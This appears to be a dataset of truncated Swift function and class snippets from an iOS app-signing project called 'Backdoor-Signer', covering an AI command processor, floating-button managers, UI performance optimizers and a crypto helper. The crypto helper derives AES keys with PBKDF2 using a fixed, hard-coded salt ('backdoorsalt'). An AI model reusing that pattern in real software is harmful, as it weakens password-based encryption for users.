static let shared = CustomCommandProcessor()

// Private initializer for singleton
private init() {"
1938,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift","/ Process a command extracted from an AI response / - Parameters: /   - commandString: The full command string containing command and parameter /   - completion: Callback with result information","func processCommand(_ commandString: String, completion: @escaping (AppCommandResult) -> Void) {
// Extract command and parameter
let components = commandString.split(separator: "":"", maxSplits: 1).map(String.init)

guard components.count >= 1 else {"
1939,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift","/ Execute a command with the given parameter / - Parameters: /   - command: The command to execute /   - parameter: The parameter for the command /   - completion: Callback with result information","private func executeCommand(_ command: String, parameter: String, completion: @escaping (AppCommandResult) -> Void) {
// Log command execution
Debug.shared.log(message: ""Executing command: \(command) with parameter: \(parameter)"", type: .info)

// Check if the command is registered with AppContextManager
if AppContextManager.shared.availableCommands().contains(command.lowercased()) {"
1940,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift","MARK: - Command Implementations","private func signApp(named appName: String, completion: @escaping (AppCommandResult) -> Void) {
// Find app in downloaded apps
let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()
let matchingApps = downloadedApps.filter {"
1941,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift","Function installApp - implements installapp functionality","private func installApp(named appName: String, completion: @escaping (AppCommandResult) -> Void) {
// Simulate app installation
completion(
.successWithResult(
""Installation command received for '\(appName)'. In a real implementation, this would begin the installation process.""
)
)
}

private func openApp(named appName: String, completion: @escaping (AppCommandResult) -> Void) {"
1942,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift","Function openApp - implements openapp functionality","private func openApp(named appName: String, completion: @escaping (AppCommandResult) -> Void) {
// Find app in signed apps
let signedApps = CoreDataManager.shared.getDatedSignedApps()
let matchingApps = signedApps.filter {"
1943,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift","Function showHelp - implements showhelp functionality","private func showHelp(topic: String, completion: @escaping (AppCommandResult) -> Void) {
var helpText = ""Backdoor AI Assistant Help""

if topic.isEmpty {"
1944,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","MARK: - Notification Names","extension Notification.Name {
static let showAIAssistant = Notification.Name(""showAIAssistant"")
// Tab change notifications are defined in TabbarView.swift
}

/// Manages AI assistant functionality across the app
final class FloatingButtonManager {"
1945,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","/ Manages AI assistant functionality across the app","final class FloatingButtonManager {
// Singleton instance
static let shared = FloatingButtonManager()

// Thread-safe state tracking with a dedicated queue
private let stateQueue = DispatchQueue(label: ""com.backdoor.floatingButtonState"", qos: .userInteractive)
private var _isPresentingChat = false
private var isPresentingChat: Bool {"
1946,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","Function setupObservers - sets upobservers","private func setupObservers() {
// Use processingQueue to ensure thread safety when setting up observers
processingQueue.async { [weak self] in"
1947,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality","@objc private func handleAppDidBecomeActive() {
isAppActive = true
}

@objc private func handleAppWillResignActive() {"
1948,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","Function handleAppWillResignActive - implements handleappwillresignactive functionality","@objc private func handleAppWillResignActive() {
isAppActive = false
}

private func setupAIInteraction() {"
1949,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","Function setupAIInteraction - sets upaiinteraction","private func setupAIInteraction() {
// Set up AI interaction
Debug.shared.log(message: ""AI interaction setup complete"", type: .debug)
}

// MARK: - Public Methods

/// Programmatically show the AI assistant
func showAIAssistant() {"
1950,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","MARK: - Public Methods / Programmatically show the AI assistant","func showAIAssistant() {
handleAIRequest()
}

/// Show the floating button - wrapper for showAIAssistant
func show() {"
1951,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","/ Show the floating button - wrapper for showAIAssistant","func show() {
showAIAssistant()
}

/// Hide the floating button
func hide() {"
1952,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","/ Hide the floating button","func hide() {
// Reset state if currently presenting
if isPresentingChat {"
1953,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","MARK: - AI Request Handling","@objc private func handleAIRequest() {
// Skip if already presenting or app is inactive
guard !isPresentingChat, isAppActive else {"
1954,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","Function presentChatInterfaceSafely - implements presentchatinterfacesafely functionality","private func presentChatInterfaceSafely(with session: ChatSession, from presenter: UIViewController) {
// Validate the presenter is still valid and not in transition
guard !presenter.isBeingDismissed,
!presenter.isBeingPresented,
!presenter.isMovingToParent,
!presenter.isMovingFromParent,
presenter.view.window != nil
else {"
1955,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","Function presentViewControllerSafely - implements presentviewcontrollersafely functionality","private func presentViewControllerSafely(_ viewController: UIViewController, from presenter: UIViewController) {
// Check if presenter is valid - if not, reset state and return
guard !presenter.isBeingDismissed, !presenter.isBeingPresented, presenter.view.window != nil else {"
1956,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","Function performPresentation - implements performpresentation functionality","private func performPresentation(_ viewController: UIViewController, from presenter: UIViewController) {
// Present directly without try-catch since UIKit presentation doesn't throw
presenter.present(viewController, animated: true) {"
1957,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift","Function showErrorAlert - implements showerroralert functionality","private func showErrorAlert(message: String, on viewController: UIViewController) {
let alert = UIAlertController(
title: ""Chat Error"",
message: message,
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""OK"", style: .default))

// Present alert with a slight delay to ensure any pending transitions complete"
1958,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Integrates all performance optimizations into the app","final class OptimizationIntegrator {
// MARK: - Singleton

/// Shared instance
static let shared = OptimizationIntegrator()

// MARK: - Properties

/// Flag to track if the optimizations have been integrated
private var didIntegrateOptimizations = false"
1959,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","MARK: - Integration / Integrate all optimizations into the app / - Parameter application: The UIApplication instance","func integrateOptimizations(in _: UIApplication) {
guard !didIntegrateOptimizations else {"
1960,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","MARK: - Setup Methods / Initialize all optimizer components","private func initializeOptimizers() {
// The act of accessing these shared instances initializes them
_ = AppPerformanceOptimizer.shared
_ = ImageCache.shared
_ = NetworkManager.shared

Debug.shared.log(message: ""Performance optimizers initialized"", type: .debug)
}

/// Register for needed notifications"
1961,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Register for needed notifications","private func registerForNotifications() {
// Register for view controller lifecycle notifications
let notificationCenter = NotificationCenter.default

// Register for app lifecycle notifications
notificationCenter.addObserver(
self,
selector: #selector(handleAppDidBecomeActive),
name: UIApplication.didBecomeActiveNotification,
object: nil"
1962,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Configure network optimizations","private func configureNetworkOptimizations() {
// Configure URLCache with appropriate sizes
let memoryCapacity = 10 * 1024 * 1024 // 10 MB
let diskCapacity = 50 * 1024 * 1024 // 50 MB
let cache = URLCache(memoryCapacity: memoryCapacity, diskCapacity: diskCapacity, diskPath: ""URLCache"")
URLCache.shared = cache

// Configure URLSession
let config = URLSessionConfiguration.default
config.requestCachePolicy = .useProtocolCachePolicy"
1963,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Apply global optimizations to table and collection views","private func optimizeListViews() {
// Register for UITableView.shouldPrefetchDataSource
// We'll optimize table views as they're created

NotificationCenter.default.addObserver(
self,
selector: #selector(handleViewControllerDidLoad),
name: NSNotification.Name(""ViewControllerDidLoad""),
object: nil
)"
1964,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Apply method swizzling for performance optimizations","private func applyMethodSwizzling() {
// Swizzle view controller lifecycle methods to add optimization
UIViewController.optimizeLifecycleMethods()

Debug.shared.log(message: ""Method swizzling applied"", type: .debug)
}

// MARK: - Notification Handlers

@objc private func handleViewControllerDidLoad(_ notification: Notification) {"
1965,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","MARK: - Notification Handlers","@objc private func handleViewControllerDidLoad(_ notification: Notification) {
if let viewController = notification.object as? UIViewController {"
1966,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality","@objc private func handleAppDidBecomeActive() {
Debug.shared.log(message: ""App became active, applying dynamic optimizations"", type: .debug)

// Optimize currently visible view controller
if let topVC = UIApplication.shared.topMostViewController() {"
1967,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","Function handleLowMemoryWarning - implements handlelowmemorywarning functionality","@objc private func handleLowMemoryWarning() {
Debug.shared.log(message: ""Handling low memory warning"", type: .warning)

// Clear image caches
ImageCache.shared.clearCache()

// Clear network caches
NetworkManager.shared.clearCache()

// Clear any NSCache instances"
1968,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","MARK: - View Controller Optimization / Optimize a view controller for better performance / - Parameter viewController: The view controller to optimize","func optimizeViewController(_ viewController: UIViewController) {
// Use AppPerformanceOptimizer to optimize the view controller
AppPerformanceOptimizer.shared.optimizeViewController(viewController)

// Optimize table views
if let tableVC = viewController as? UITableViewController {"
1969,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Optimize a table view controller / - Parameter tableViewController: The table view controller to optimize","private func optimizeTableViewController(_ tableViewController: UITableViewController) {
let tableView = tableViewController.tableView

// Enable prefetching if not already enabled
tableView?.prefetchDataSource = tableViewController as? UITableViewDataSourcePrefetching

// Set estimatedRowHeight for better performance
if tableView?.rowHeight == UITableView.automaticDimension {"
1970,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Track cell reuse identifiers to find inefficient cell usage / - Parameter tableView: The table view to track","private func trackCellReuseIdentifiers(in tableView: UITableView?) {
guard let tableView = tableView else { return }"
1971,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","MARK: - UIViewController Extension","extension UIViewController {
/// Apply optimization-related method swizzling
static func optimizeLifecycleMethods() {"
1972,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Apply optimization-related method swizzling","static func optimizeLifecycleMethods() {
let originalMethod = class_getInstanceMethod(UIViewController.self, #selector(viewDidLoad))
let swizzledMethod = class_getInstanceMethod(UIViewController.self, #selector(optimized_viewDidLoad))

if let originalMethod = originalMethod, let swizzledMethod = swizzledMethod {"
1973,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","Function optimized_viewDidLoad - implements optimized viewdidload functionality","@objc private func optimized_viewDidLoad() {
// Call original implementation
optimized_viewDidLoad()

// Post notification for optimizer
NotificationCenter.default.post(name: NSNotification.Name(""ViewControllerDidLoad""), object: self)

// Apply view-specific optimizations
optimizeViewHierarchy()
}"
1974,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Apply optimizations to the view hierarchy","private func optimizeViewHierarchy() {
// Ensure rasterization for complex views
for subview in view.subviews {"
1975,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","MARK: - Integration with AppDelegate","extension AppDelegate {
/// Call this method from application(_:didFinishLaunchingWithOptions:)
func integratePerformanceOptimizations() {"
1976,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift","/ Call this method from application(_:didFinishLaunchingWithOptions:)","func integratePerformanceOptimizations() {
OptimizationIntegrator.shared.integrateOptimizations(in: UIApplication.shared)
}
}
"
1977,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ A class that optimizes UITableView loading and scrolling performance","final class TableViewOptimizer: NSObject {
// MARK: - Configuration

/// Configuration for the table view optimizer
struct Configuration {"
1978,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Configuration / Configuration for the table view optimizer","struct Configuration {
/// Number of items to load per page
var pageSize: Int = 20

/// Whether to prefetch items
var enablePrefetching: Bool = true

/// Number of items to prefetch
var prefetchDistance: Int = 10
"
1979,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Setup / Set up the table view for optimized performance","private func setupTableView() {
guard let tableView = tableView else { return }"
1980,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Core Data Integration / Configure with a fetched results controller for Core Data integration / - Parameters: /   - fetchRequest: The fetch request /   - managedObjectContext: The managed object context /   - sectionNameKeyPath: Optional key path for sections /   - cacheName: Optional cache name","func configureFetchedResultsController(
fetchRequest: NSFetchRequest<NSManagedObject>,
managedObjectContext: NSManagedObjectContext,
sectionNameKeyPath: String? = nil,
cacheName: String? = nil
) {"
1981,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Perform fetch with the fetched results controller","func performFetch() {
guard let fetchedResultsController = fetchedResultsController else {"
1982,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Pagination / Load the next page of data","func loadNextPage() {
guard !isLoading, hasMorePages() else { return }"
1983,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Check if there are more pages to load / - Returns: True if there are more pages","func hasMorePages() -> Bool {
let itemsLoaded = currentPage * configuration.pageSize
return itemsLoaded < totalItems
}

// MARK: - Utility Methods

/// Get the object at the given index path
/// - Parameter indexPath: The index path
/// - Returns: The managed object at the index path"
1984,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Utility Methods / Get the object at the given index path / - Parameter indexPath: The index path / - Returns: The managed object at the index path","func object(at indexPath: IndexPath) -> NSManagedObject? {
return fetchedResultsController?.object(at: indexPath)
}

/// Get the number of sections
/// - Returns: The number of sections
func numberOfSections() -> Int {"
1985,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Get the number of sections / - Returns: The number of sections","func numberOfSections() -> Int {
return fetchedResultsController?.sections?.count ?? 0
}

/// Get the number of objects in the given section
/// - Parameter section: The section index
/// - Returns: The number of objects in the section
func numberOfObjects(in section: Int) -> Int {"
1986,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Get the number of objects in the given section / - Parameter section: The section index / - Returns: The number of objects in the section","func numberOfObjects(in section: Int) -> Int {
return fetchedResultsController?.sections?[section].numberOfObjects ?? 0
}

/// Clear the cell height cache
func clearCellHeightCache() {"
1987,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Clear the cell height cache","func clearCellHeightCache() {
cellHeightCache.removeAll()
}

/// Cache the height for a cell at the given index path
/// - Parameters:
///   - height: The height to cache
///   - indexPath: The index path
func cacheHeight(_ height: CGFloat, for indexPath: IndexPath) {"
1988,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Cache the height for a cell at the given index path / - Parameters: /   - height: The height to cache /   - indexPath: The index path","func cacheHeight(_ height: CGFloat, for indexPath: IndexPath) {
// Limit cache size
if cellHeightCache.count > configuration.maxCachedCells {"
1989,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Get the cached height for a cell at the given index path / - Parameter indexPath: The index path / - Returns: The cached height, if available","func cachedHeight(for indexPath: IndexPath) -> CGFloat? {
return cellHeightCache[indexPath]
}

/// Reset the pagination state
func resetPagination() {"
1990,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Reset the pagination state","func resetPagination() {
currentPage = 0
isLoading = false
clearCellHeightCache()
}

/// Set the total number of items available
/// - Parameter count: The total number of items
func setTotalItems(_ count: Int) {"
1991,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","/ Set the total number of items available / - Parameter count: The total number of items","func setTotalItems(_ count: Int) {
totalItems = count
}
}

// MARK: - UITableViewDataSourcePrefetching

extension TableViewOptimizer: UITableViewDataSourcePrefetching {"
1992,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - UITableViewDataSourcePrefetching","extension TableViewOptimizer: UITableViewDataSourcePrefetching {
func tableView(_: UITableView, prefetchRowsAt indexPaths: [IndexPath]) {"
1993,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, prefetchRowsAt indexPaths: [IndexPath]) {
guard configuration.enablePrefetching else { return }"
1994,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, cancelPrefetchingForRowsAt indexPaths: [IndexPath]) {
// Cancel any prefetching operations for these rows
for indexPath in indexPaths {"
1995,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - NSFetchedResultsControllerDelegate","extension TableViewOptimizer: NSFetchedResultsControllerDelegate {
func controllerWillChangeContent(_: NSFetchedResultsController<NSFetchRequestResult>) {"
1996,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function controllerWillChangeContent - implements controllerwillchangecontent functionality","func controllerWillChangeContent(_: NSFetchedResultsController<NSFetchRequestResult>) {
tableView?.beginUpdates()
}

func controller(_: NSFetchedResultsController<NSFetchRequestResult>,
didChange _: NSFetchedResultsSectionInfo,
atSectionIndex sectionIndex: Int,
for type: NSFetchedResultsChangeType)
{"
1997,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function controller - implements controller functionality","func controller(_: NSFetchedResultsController<NSFetchRequestResult>,
didChange _: NSFetchedResultsSectionInfo,
atSectionIndex sectionIndex: Int,
for type: NSFetchedResultsChangeType)
{"
1998,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function controller - implements controller functionality","func controller(_: NSFetchedResultsController<NSFetchRequestResult>,
didChange _: Any,
at indexPath: IndexPath?,
for type: NSFetchedResultsChangeType,
newIndexPath: IndexPath?)
{"
1999,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function controllerDidChangeContent - implements controllerdidchangecontent functionality","func controllerDidChangeContent(_: NSFetchedResultsController<NSFetchRequestResult>) {
tableView?.endUpdates()
}
}

// MARK: - SkeletonLoadingCell

/// A table view cell that shows a skeleton loading animation
class SkeletonLoadingCell: UITableViewCell {"
2000,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - SkeletonLoadingCell / A table view cell that shows a skeleton loading animation","class SkeletonLoadingCell: UITableViewCell {
// MARK: - UI Components

private let containerView = UIView()
private let iconView = UIView()
private let titleView = UIView()
private let subtitleView = UIView()

// MARK: - Animation Layers
"
2001,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Setup","private func setupViews() {
selectionStyle = .none
backgroundColor = .clear

// Add container view
containerView.backgroundColor = .systemBackground
containerView.layer.cornerRadius = 8
containerView.clipsToBounds = true
containerView.translatesAutoresizingMaskIntoConstraints = false
contentView.addSubview(containerView)"
2002,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function addGradientLayers - implements addgradientlayers functionality","private func addGradientLayers() {
let views = [iconView, titleView, subtitleView]

for view in views {"
2003,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Animation","func startAnimating() {
// Create animation for shimmer effect
let animation = CABasicAnimation(keyPath: ""locations"")
animation.fromValue = [-1.0, -0.5, 0.0] // Start positions
animation.toValue = [1.0, 1.5, 2.0] // End positions
animation.duration = 1.5
animation.repeatCount = .infinity

// Add animation to gradient layers
for layer in animationLayers {"
2004,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function stopAnimating - implements stopanimating functionality","func stopAnimating() {
// Remove animations
for layer in animationLayers {"
2005,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Layout","override func layoutSubviews() {
super.layoutSubviews()

// Update gradient layer frames
for (index, layer) in animationLayers.enumerated() {"
2006,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Lifecycle","override func didMoveToWindow() {
super.didMoveToWindow()

if window != nil {"
2007,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","/ Manages the floating terminal button across the app","final class TerminalButtonManager {
// Singleton instance
static let shared = TerminalButtonManager()

// UI components
private let floatingButton = FloatingTerminalButton()

// Thread-safe state tracking
private let stateQueue = DispatchQueue(label: ""com.backdoor.terminalButtonState"", qos: .userInteractive)
private var _isPresentingTerminal = false"
2008,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function configureFloatingButton - implements configurefloatingbutton functionality","private func configureFloatingButton() {
// Ensure it's above other views but below AI button
floatingButton.layer.zPosition = 998
floatingButton.isUserInteractionEnabled = true

// Start position check timer for continuous accessibility
startPositionCheckTimer()
}

private func startPositionCheckTimer() {"
2009,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function startPositionCheckTimer - implements startpositionchecktimer functionality","private func startPositionCheckTimer() {
// Invalidate existing timer if any
positionCheckTimer?.invalidate()

// Create a new timer that periodically checks button position
positionCheckTimer = Timer.scheduledTimer(withTimeInterval: 30.0, repeats: true) { [weak self] _ in"
2010,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function checkButtonAccessibility - implements checkbuttonaccessibility functionality","private func checkButtonAccessibility() {
// Skip if button is hidden or not in a view
guard !floatingButton.isHidden, floatingButton.superview != nil else { return }"
2011,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function setupObservers - sets upobservers","private func setupObservers() {
// Observe orientation changes
NotificationCenter.default.addObserver(
self,
selector: #selector(handleOrientationChange),
name: UIDevice.orientationDidChangeNotification,
object: nil
)

// Observe interface style changes"
2012,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleKeyboardWillShow - implements handlekeyboardwillshow functionality","@objc private func handleKeyboardWillShow(_ notification: Notification) {
guard !isPresentingTerminal, !floatingButton.isHidden,
let keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect,
let parentVC = parentViewController else { return }"
2013,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleKeyboardWillHide - implements handlekeyboardwillhide functionality","@objc private func handleKeyboardWillHide(_ notification: Notification) {
// Reset button position when keyboard hides
if !isPresentingTerminal && !floatingButton.isHidden {"
2014,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleTabChange - implements handletabchange functionality","@objc private func handleTabChange(_: Notification) {
// Skip if app is inactive
guard isAppActive else {"
2015,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function attachToRootView - implements attachtorootview functionality","private func attachToRootView() {
// Skip if presenting terminal
guard !isPresentingTerminal else {"
2016,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleOrientationChange - implements handleorientationchange functionality","@objc private func handleOrientationChange() {
DispatchQueue.main.async { [weak self] in"
2017,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function updateButtonPosition - updates buttonposition","private func updateButtonPosition() {
// Skip if button is hidden or app inactive
guard !floatingButton.isHidden, isAppActive else { return }"
2018,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality","@objc private func handleAppDidBecomeActive() {
isAppActive = true

DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) { [weak self] in"
2019,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleAppWillResignActive - implements handleappwillresignactive functionality","@objc private func handleAppWillResignActive() {
isAppActive = false
hide()

// Invalidate timer when app is inactive
positionCheckTimer?.invalidate()
positionCheckTimer = nil
}

@objc private func updateButtonAppearance() {"
2020,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function updateButtonAppearance - updates buttonappearance","@objc private func updateButtonAppearance() {
DispatchQueue.main.async { [weak self] in"
2021,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","/ Show the terminal button","func show() {
DispatchQueue.main.async { [weak self] in"
2022,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","/ Hide the terminal button","func hide() {
DispatchQueue.main.async { [weak self] in"
2023,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleTerminalRequest - implements handleterminalrequest functionality","@objc private func handleTerminalRequest() {
// Ensure we're on main thread
if !Thread.isMainThread {"
2024,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function dismissTerminal - implements dismissterminal functionality","@objc private func dismissTerminal() {
guard let presentingVC = UIApplication.shared.topMostViewController()?.presentingViewController else {"
2025,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","/ Helper for basic cryptography operations using native iOS libraries","class CryptoHelper {
// Singleton instance
static let shared = CryptoHelper()

private init() {}"
2026,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","MARK: - Encryption Methods / Encrypt data using AES with a password / - Parameters: /   - data: Data to encrypt /   - password: Password for encryption / - Returns: Encrypted data as a base64 string","func encryptAES(_ data: Data, password: String) -> String? {
// Generate a key from the password
guard let key = deriveKeyData(from: password, salt: ""backdoorsalt"", keyLength: 32) else {"
2027,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","MARK: - Helper Methods / Derive a key from a password using PBKDF2 / - Parameters: /   - password: The password to derive the key from /   - salt: Salt for the key derivation /   - keyLength: Length of the key to generate in bytes / - Returns: The derived key as Data","func deriveKeyData(from password: String, salt: String, keyLength: Int) -> Data? {
guard let passwordData = password.data(using: .utf8),
let saltData = salt.data(using: .utf8) else {"
